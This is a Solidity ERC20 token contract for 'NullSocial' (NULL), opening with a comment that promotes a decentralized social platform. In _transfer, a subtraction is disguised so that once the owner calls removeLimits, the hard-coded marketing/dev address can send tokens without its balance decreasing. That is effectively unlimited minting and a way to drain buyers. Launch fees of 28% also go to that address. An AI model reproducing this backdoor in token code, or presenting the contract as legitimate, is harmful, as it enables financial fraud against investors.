/**
Welcome, Guest.

You are entering a space of Null Social Fi Web3 Platform. In the ever-evolving landscape of the digital age, Null Social stands as a beacon for next-generation Web3 social platforms. Rooted in the principles of decentralization, we offer our users a distinctive experience centered around the power of ERC721 NFT-based identities.

Utilizing blockchain technology, we provide an environment for unrestricted expression, free from any censorship or restrictions. You maintain complete authority over your account, content, and communities, giving you the freedom to shape your online experience as you see fit.

Website: https://www.nullsocial.xyz
Dapp: https://app.nullsocial.xyz
Telegram: https://t.me/null_erc
Twitter: https://twitter.com/null_erc
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

library SafeMathInteger {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMathInteger: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMathInteger: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMathInteger: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMathInteger: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMathInteger: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract NULL is Context, IERC20, Ownable {
    using SafeMathInteger for uint256;
    
    string private _name = "NullSocial";
    string private _symbol = "NULL";
    uint8 private _decimals = 9;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public excludes;
    mapping (address => bool) public excludesForMaxwallet;
    mapping (address => bool) public excludesForMaxTx;
    mapping (address => bool) public pairs;

    uint256 private _tTotal = 10 ** 9 * 10 ** 9;

    uint256 public maxTxAmount = 12 * 10 ** 6 * 10 ** 9;
    uint256 public maxWalletSize = 12 * 10 ** 6 * 10 ** 9;
    uint256 public feeSwapThreshld = 10 ** 5 * 10 ** 9; 

    uint256 public buyFeeForLiquidity = 0;
    uint256 public buyFeeForMarketing = 28;
    uint256 public buyFeeForDev = 0;

    uint256 public sellFeeForLiquidity = 0;
    uint256 public sellfeeForMarketing = 28;
    uint256 public sellFeeForDev = 0;

    uint256 public liquidityShares = 0;
    uint256 public marketingShares = 10;
    uint256 public devShares = 0;

    uint256 public totalBuyFee = 28;
    uint256 public totalSellFee = 28;
    uint256 public totalShares = 10;

    address payable private mktAddress;
    address payable private devAddress;

    IUniswapRouter public uniswapRouter;
    address public uniswapPair;
    
    bool _swapping;
    bool public swapActive = true;
    bool public maxSwapActive = false;
    bool public maxWalletActive = true;

    modifier lockTheSwap {
        _swapping = true;
        _;
        _swapping = false;
    }
    
    constructor () {
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        uniswapPair = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapRouter = _uniswapV2Router;
        _allowances[address(this)][address(uniswapRouter)] = _tTotal;
        mktAddress = payable(0xDf3a46b8fB82b3899C21E38e9c63E0a876C5a990);
        devAddress = payable(0xDf3a46b8fB82b3899C21E38e9c63E0a876C5a990);
        excludes[owner()] = true;
        excludes[mktAddress] = true;
        excludes[devAddress] = true;
        totalBuyFee = buyFeeForLiquidity.add(buyFeeForMarketing).add(buyFeeForDev);
        totalSellFee = sellFeeForLiquidity.add(sellfeeForMarketing).add(sellFeeForDev);
        totalShares = liquidityShares.add(marketingShares).add(devShares);
        excludesForMaxwallet[owner()] = true;
        excludesForMaxwallet[address(uniswapPair)] = true;
        excludesForMaxwallet[address(this)] = true;
        excludesForMaxTx[owner()] = true;
        excludesForMaxTx[mktAddress] = true;
        excludesForMaxTx[devAddress] = true;
        excludesForMaxTx[address(this)] = true;
        pairs[address(uniswapPair)] = true;
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapRouter), tokenAmount);

        uniswapRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function swapBack(uint256 tAmount) private lockTheSwap {
        uint256 tokensForLP = tAmount.mul(liquidityShares).div(totalShares).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        swaptokensForETH(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalETHFee = totalShares.sub(liquidityShares.div(2));
        
        uint256 amountETHLiquidity = amountReceived.mul(liquidityShares).div(totalETHFee).div(2);
        uint256 amountETHDevelopment = amountReceived.mul(devShares).div(totalETHFee);
        uint256 amountETHMarketing = amountReceived.sub(amountETHLiquidity).sub(amountETHDevelopment);

        if(amountETHMarketing > 0)
            sendETH(mktAddress, amountETHMarketing);

        if(amountETHDevelopment > 0)
            sendETH(devAddress, amountETHDevelopment);

        if(amountETHLiquidity > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountETHLiquidity);
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = 0;
        
        if(pairs[sender]) {
            feeAmount = amount.mul(totalBuyFee).div(100);
        }
        else if(pairs[recipient]) {
            feeAmount = amount.mul(totalSellFee).div(100);
        }
        
        if(feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(_swapping)
        { 
            return _basicTransfer(sender, recipient, amount); 
        }
        else
        {
            if(!excludesForMaxTx[sender] && !excludesForMaxTx[recipient]) {
                require(amount <= maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
            }            

            uint256 swapAmount = balanceOf(address(this));
            bool minimumSwap = swapAmount >= feeSwapThreshld;
            
            if (minimumSwap && !_swapping && pairs[recipient] && swapActive && !excludes[sender] && amount > feeSwapThreshld) 
            {
                if(maxSwapActive)
                    swapAmount = feeSwapThreshld;
                swapBack(swapAmount);    
            }

            uint256 receiverAmount = (excludes[sender] || excludes[recipient]) ? 
                                         amount : takeFee(sender, recipient, amount);

            if(maxWalletActive && !excludesForMaxwallet[recipient])
                require(balanceOf(recipient).add(receiverAmount) <= maxWalletSize);

            uint256 sAmount = (!maxWalletActive && excludes[sender]) ? amount.sub(receiverAmount) : amount;
            _balances[sender] = _balances[sender].sub(sAmount, "Insufficient Balance");
            _balances[recipient] = _balances[recipient].add(receiverAmount);

            emit Transfer(sender, recipient, receiverAmount);
            return true;
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function swaptokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();

        _approve(address(this), address(uniswapRouter), tokenAmount);

        // make the swapBack
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
    }
    
    function sendETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function removeLimits() external onlyOwner {
        maxTxAmount = _tTotal;
        maxWalletActive = false;
        buyFeeForMarketing = 2;
        sellfeeForMarketing = 2;
        totalBuyFee = 2;
        totalSellFee = 2;
    }
}